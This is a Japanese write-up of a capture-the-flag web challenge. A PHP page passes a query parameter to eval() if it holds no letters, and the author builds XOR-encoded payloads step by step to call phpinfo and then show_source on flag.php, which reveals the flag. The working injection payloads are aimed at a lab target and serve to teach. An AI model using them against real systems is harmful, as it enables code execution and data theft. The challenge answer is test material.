# Web Warm-up

```txt
Warm up! Can you break all the tasks? I'll pray for you!

read flag.php

Link: Link
```

## 概要

リンクを開くとphpのソースが表示される。  

```php
<?php
if(isset($_GET['view-source'])){
    highlight_file(__FILE__);
    die();
}

if(isset($_GET['warmup'])){
    if(!preg_match('/[A-Za-z]/is',$_GET['warmup']) && strlen($_GET['warmup']) <= 60) {
    eval($_GET['warmup']);
    }else{
        die("Try harder!");
    }
}else{
    die("No param given");
}
```

warmupにアルファベットが含まれていない かつ 60文字以下な場合にevalが呼び出される様だ。  

xorでよしなにするんだろう。  
例えば以下のように`phpinfo`と`_______`をxorした値をとる。  
そしてその結果を`_______`とxorすれば`phpinfo`となり、phpinfoが実行される。

```php
$_ = ('phpinfo' ^ '_______');
print($_ . "\n");
```

> /7/6190

`url?warmup=("/7/6190"^"_______")();`にアクセスするとphpinfoが実行されているのが確認できる。

disable_functionsを見ると、system等が無効化されている。  
(これに気づかずにずっと`system(cat flag.txt)`しようとして悩んでた)

`system`が実行できないとなると、ソースコードを表示する関数を使うのだろう。  

## 解

highlight_fileでよしなにするとギリギリ60文字超えてしまい、実行してくれなかった。  
調べていると`show_source`とやらがあった。少しだけ短いのでこれにしたら行けた。

```php
$_ = ('show_source' ^ '_____________');
print($_ . "\n"); // => ,70(,0*-<:

$_ = ('flag.php' ^ '________');
print($_ . "\n"); // => 93>8q/7/
```

これを元にurlを組み立てる。

```txt
[url]/?warmup=(",70(,0*-<:"^"___________")(("93>8/7/"^"____.___"));
```

しかし、これでは実行できない。  
ローカルでソースコードをコピペして再現したら、以下のようなエラーが出ていた。

> Fatal error: Uncaught Error: Call to undefined function showsource() in C:\xampp\htdocs\ctf.php(30) : eval()'d code:1 Stack trace: #0 C:\xampp\htdocs\ctf.php(30): eval() #1 {main} thrown in C:\xampp\htdocs\ctf.php(30) : eval()'d code on line 1

「`showsource()`関数がないよ」って言っている。今呼び出したいのは`show_source`だ。  
試しに`",70(,0*-<:"^"___________"`を実行してみると、`showsource`になる。

これは、`"_"^"_"`の結果が`%00`になってしまい、表示されてなかったのが原因。  
`%00`と`_`でxorすれば`_`になるので%00を入れてやってみる。

```txt
[url]/?warmup=(",70(%00,0*-<:"^"___________")(("93>8/7/"^"________"));
```

まだ上手くいかない。ローカルで試すと以下のエラー。

> Warning: show_source(flagphp): failed to open stream: No such file or directory in C:\xampp\htdocs\ctf.php(30) : eval()'d code on line 1
Warning: show_source(): Failed opening 'flagphp' for highlighting in C:\xampp\htdocs\ctf.php(30) : eval()'d code on line 1
Parse error: syntax error, unexpected end of file in C:\xampp\htdocs\flag.php on line 2

`show_source()`はエラーなく実行できていそうだ。  
「`flagphp`がないよ」って言っている。本来は`flag.php`だ。  
`.`が抜けている。`_`と同じように`%00`と`.`をxorさせることで解決。

```txt
[url]?warmup=(",70(%00,0*-<:"^"___________")(("93>8%00/7/"^"____.___"));
```

`flag.php`が表示される。

```php
<?php
$flag = "ASIS{w4rm_up_y0ur_br4in}";
?>
```

```txt
ASIS{w4rm_up_y0ur_br4in}
```
